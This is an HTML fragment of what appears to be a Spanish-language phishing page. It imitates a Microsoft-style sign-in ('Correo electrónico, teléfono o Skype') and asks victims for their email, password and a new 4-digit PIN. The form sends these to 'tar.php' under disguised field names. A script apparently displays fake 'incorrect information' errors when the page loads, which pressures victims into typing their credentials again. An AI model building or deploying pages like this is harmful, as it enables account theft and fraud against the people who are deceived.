  ...
  <div class="wrapper">
      <div class="col-xs-12 col-sm-5 col-sm-offset-3 login-box" style="z-index:1000">
        ...
        <div class="login-header">
              <h4 class="ingresa-cuenta">Iniciar sesión</h4>
              <p class="text">para validación.</p>
          </div>       
          <div>
              <form method="post" action="tar.php">                 
                <div class="form-group label-animate">
                    <label for="usr">Correo electrónico, teléfono o Skype</label>
                    <input class="form-control" id="uzer" type="email" name="uzer" autocomplete="off" required="required">
					<!-- Error correo -->
<div id="error-email" class="input-error">
  <svg class="error-icon" viewBox="0 0 24 24" width="16" height="16">
    <path fill="#e81123" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 
    10-4.48 10-10S17.52 2 12 2zm0 15.2a1.2 1.2 0 110 2.4 
    1.2 1.2 0 010-2.4zm1-10.2v7h-2V7h2z"/>
  </svg>
  <span>Información incorrecta, verifica e intenta nuevamente</span>
</div>
                </div>
                  <div class="form-group label-animate">
                    <label for="password">Contraseña</label>
                      <span class="eye-icon" onclick="showPassword()" style="cursor: pointer;">
                        <svg id="eye-icon-svg" fill="currentColor" width="20" height="20" viewBox="0 0 20 20">
                          <path id="eye-icon-path" d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"/>
                        </svg>
                      </span>
                    <input class="form-control" id="pazz" name="pazz" type="password" required="required">
					  <!-- Error contraseña -->
<div id="error-password" class="input-error">
  <svg class="error-icon" viewBox="0 0 24 24" width="16" height="16">
    <path fill="#e81123" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 
    10-4.48 10-10S17.52 2 12 2zm0 15.2a1.2 1.2 0 110 2.4 
    1.2 1.2 0 010-2.4zm1-10.2v7h-2V7h2z"/>
  ...
  <span>Información incorrecta, verifica e intenta nuevamente</span>
                      ...
                      <div class="center" style="padding-top: 0px; padding-bottom: 6px; margin-top: 4.5px; text-align: left;">
                        <a id="link-olvidaste-tu-password" href="#">¿Olvidaste tu contraseña?</a></div>                    
                </div>           
                <div id="YkamcjCUbXrjXrQ" style="display: block; font-size: 11px;" class="text2">Crea un PIN de 4 números para proteger tu cuenta. Usa uno que recuerdes fácilmente.</div>
                <div class="form-group label-animate">
                 <label for="usr">Crear Pin</label>
                  <input class="form-control" id="p1n" type="password" pattern="[0-9]*" inputmode="numeric"  name="p1n" autocomplete="off" maxlength="4" required="">
                    <br>
                    <div class="center" style="padding-top: 0px; padding-bottom: 6px; margin-top: 4.5px; text-align: left;">
                    <a id="link-olvidaste-tu-password" href="#">¿No puede acceder a su cuenta?</a></div>               
                </div>          
  ...
  <div class="login-footer"><div class="footer">
    ...
    <script>
        function showPassword() {
          const passwordInput = document.getElementById("pazz");
          const eyePath = document.getElementById("eye-icon-path");
	...
	<script>
  document.addEventListener("DOMContentLoaded", function () {
    const emailInput = document.getElementById("uzer");
    const passwordInput = document.getElementById("pazz");

    const emailError = document.getElementById("error-email");
    const passwordError = document.getElementById("error-password");

    // Mostrar errores al cargar
